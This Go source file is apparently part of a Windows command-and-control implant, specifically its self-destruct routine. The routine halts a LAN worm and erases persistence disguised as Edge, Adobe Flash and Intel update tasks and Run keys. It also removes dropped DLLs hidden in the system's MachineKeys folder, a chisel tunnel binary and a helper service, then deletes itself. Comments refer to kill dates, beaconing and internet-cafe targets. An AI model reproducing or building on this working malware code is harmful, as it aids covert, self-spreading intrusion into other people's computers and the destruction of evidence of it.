//go:build windows

// Full agent self-destruct (자폭). Removes every persistence trace the
// agent could have created — all disguise profiles, not just the one this
// instance happened to pick (profile choice is PID-based) — wipes disk
// artifacts, then self-deletes and exits.
//
// Triggered by:
//   - operator cmd "selfdestruct"
//   - KILL_DATE / MaxAge expiry (shouldDie loop checks)
//   - server 410 Gone kill-date reply on the HTTP beacon
//
// "die" remains a quiet process-stop (no cleanup) for fast takedowns.
package main

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"sync/atomic"

	"golang.org/x/sys/windows/registry"
)

// selfDestructing gates re-installers (persistHealthCheck) during teardown
// so nothing races us and re-creates persistence mid-wipe.
var selfDestructing int32

func isSelfDestructing() bool { return atomic.LoadInt32(&selfDestructing) == 1 }

// sdProfiles mirrors every profile in pcbang.go pickProfile() so teardown
// is exhaustive regardless of which profile runs on this host.
var sdProfiles = []disguiseProfile{
	{TaskName: "MicrosoftEdgeUpdateTask", RegistryName: "MicrosoftEdgeUpdateTask", FileName: "EdgeUpdateCore.dll", DirName: `Microsoft\EdgeUpdate`},
	{TaskName: "AdobeFlashPlayerUpdateSvc", RegistryName: "AdobeFlashUpdateSvc", FileName: "FlashUpdateCheck.dll", DirName: `Adobe\Flash Player\Update`},
	{TaskName: "IntelGfxUpdate", RegistryName: "IntelGFXUpdate", FileName: "GfxUpdate.dll", DirName: `Intel\Graphics\Updates`},
}

func selfDestruct(reason string) {
	if !atomic.CompareAndSwapInt32(&selfDestructing, 0, 1) {
		return // teardown already in progress
	}
	fmt.Fprintf(os.Stderr, "selfdestruct: begin (%s)\n", reason)

	// Stop LAN worm so it doesn't redeploy to other hosts mid-teardown.
	StopWorm()

	// --- Registry Run keys (all profiles) ---
	for _, p := range sdProfiles {
		if k, err := registry.OpenKey(registry.CURRENT_USER,
			`Software\Microsoft\Windows\CurrentVersion\Run`,
			registry.SET_VALUE); err == nil {
			_ = k.DeleteValue(p.RegistryName)
			_ = k.Close()
		}
	}

	// --- Scheduled tasks (all profiles) ---
	for _, p := range sdProfiles {
		hiddenCmd("schtasks.exe", "/delete", "/tn", p.TaskName, "/f").Run()
	}

	// --- Leftover one-shot elevated-shell tasks (C2Lab_*) ---
	if out, err := hiddenCmd("schtasks.exe", "/query", "/fo", "csv", "/nh").Output(); err == nil {
		for _, line := range strings.Split(string(out), "\n") {
			name := strings.Trim(strings.SplitN(strings.TrimSpace(line), "\",\"", 2)[0], "\"")
			if strings.HasPrefix(name, "C2Lab_") {
				hiddenCmd("schtasks.exe", "/delete", "/tn", name, "/f").Run()
			}
		}
	}

	// --- Dropped binaries (every ProgramData location) ---
	if pd := os.Getenv("ProgramData"); pd != "" {
		mk := filepath.Join(pd, "Microsoft", "Crypto", "RSA", "MachineKeys")
		for _, p := range sdProfiles {
			_ = os.Remove(filepath.Join(mk, p.FileName))
			_ = os.Remove(filepath.Join(pd, p.DirName, p.FileName))
		}
	}

	// --- Temp artifacts ---
	_ = os.Remove(filepath.Join(os.TempDir(), "chisel_socks.exe"))
	for _, pat := range []string{"c2lab_*.bat", "c2lab_*.out", "*.part"} {
		if ms, _ := filepath.Glob(filepath.Join(os.TempDir(), pat)); ms != nil {
			for _, m := range ms {
				_ = os.Remove(m)
			}
		}
	}

	// --- Lab service cleanup (best-effort, needs elevation; no-op on
	// PC방 targets where the service was never installed) ---
	hiddenCmd("sc.exe", "stop", "DocViewerHelper").Run()
	hiddenCmd("sc.exe", "delete", "DocViewerHelper").Run()

	fmt.Fprintf(os.Stderr, "selfdestruct: teardown complete\n")

	// Self-delete last: the detached cmd child waits 2s before deleting,
	// so the process must exit here to release the file handle in time.
	if exePath, err := os.Executable(); err == nil {
		selfDelete(exePath)
	}
	os.Exit(0)
}
